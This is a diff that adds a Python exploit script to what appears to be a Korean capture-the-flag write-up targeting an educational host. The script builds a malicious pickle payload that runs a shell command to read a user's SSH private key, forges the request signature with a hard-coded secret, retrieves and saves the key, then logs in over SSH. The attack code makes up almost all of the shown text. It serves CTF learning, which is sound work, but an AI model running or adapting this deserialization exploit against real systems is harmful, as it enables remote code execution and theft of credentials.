@@ -44,6 +44,137 @@ ssh -o StrictHostKeyChecking=no -J ctfuser@intserver flaguser@flagserver
 ```
 
 ### 4) flag 획득
+```python
+#!/usr/bin/env python3
+import base64
+import hashlib
+import os
+import pickle
+import re
+import subprocess
+import textwrap
+import urllib.parse
+import urllib.request
+from pathlib import Path
+
+BASE_URL = "http://edu.arang.kr:8090"
+SECRET_KEY = "very_secret_key_do_not_guess"
+
+KEY_PATH = Path("id_rsa")
+SSH_HOST = "edu.arang.kr"
+SSH_PORT = "2222"
+SSH_USER = "appuser"
+
+
+class ReadSshKey:
+    def __reduce__(self):
+        return (
+            subprocess.getoutput,
+            ("cat /home/appuser/.ssh/id_rsa",),
+        )
+
+
+def build_payload():
+    raw = pickle.dumps(ReadSshKey(), protocol=4)
+
+    if b"pickle" in raw.lower():
+        raise RuntimeError("Unexpected blocked string in serialized payload")
+
+    data = base64.b64encode(raw).decode()
+    signature = hashlib.md5((data + SECRET_KEY).encode()).hexdigest()
+    return data, signature
+
+
+def request_key(data, signature):
+    body = urllib.parse.urlencode({
+        "data": data,
+        "signature": signature,
+    }).encode()
+
+    req = urllib.request.Request(
+        BASE_URL + "/process",
+        data=body,
+        method="POST",
+    )
+
+    with urllib.request.urlopen(req, timeout=10) as res:
+        return res.read().decode(errors="replace")
+
+
+def normalize_key(response):
+    # 응답에 PEM 헤더/푸터까지 있는 경우
+    pem = re.search(
+        r"-----BEGIN OPENSSH PRIVATE KEY-----.*?-----END OPENSSH PRIVATE KEY-----",
+        response,
+        re.DOTALL,
+    )
+    if pem:
+        return pem.group(0).strip() + "\n"
+
+    # 응답에 키 본문(base64)만 있는 경우
+    match = re.search(
+        r"(b3BlbnNzaC1rZXktdjE[\sA-Za-z0-9+/=]+)",
+        response,
+    )
+    if not match:
+        raise RuntimeError("OpenSSH key body was not found in the response")
+
+    key_body = re.sub(r"\s+", "", match.group(1))
+
+    # 실제 OpenSSH private-key 데이터인지 확인
+    decoded = base64.b64decode(key_body, validate=True)
+    if not decoded.startswith(b"openssh-key-v1\x00"):
+        raise RuntimeError("Extracted data is not an OpenSSH private key")
+
+    wrapped = "\n".join(textwrap.wrap(key_body, 70))
+    return (
+        "-----BEGIN OPENSSH PRIVATE KEY-----\n"
+        + wrapped
+        + "\n-----END OPENSSH PRIVATE KEY-----\n"
+    )
+
+
+def save_key(key_text):
+    KEY_PATH.write_text(key_text)
+    os.chmod(KEY_PATH, 0o600)
+    print(f"[+] SSH key saved: {KEY_PATH.resolve()}")
+
+
+def verify_and_connect():
+    print("[*] Verifying key format...")
+    subprocess.run(
+        ["ssh-keygen", "-l", "-f", str(KEY_PATH)],
+        check=True,
+    )
+
+    print("[*] Connecting to extserver...")
+    subprocess.run(
+        [
+            "ssh",
+            "-i", str(KEY_PATH),
+            "-o", "IdentitiesOnly=yes",
+            "-p", SSH_PORT,
+            f"{SSH_USER}@{SSH_HOST}",
+        ],
+        check=False,
+    )
+
+
+def main():
+    print("[*] Building payload...")
+    data, signature = build_payload()
+
+    print("[*] Requesting SSH key from /process...")
+    response = request_key(data, signature)
+
+    key_text = normalize_key(response)
+    save_key(key_text)
+    verify_and_connect()
+
+
+if __name__ == "__main__":
+    main()
+```
 flagserver 홈에서 flag를 읽는다. (appuser 서버의 flag.txt는 `flag{dummy_flag_1}` 미끼)
 ```
 cat flag.txt
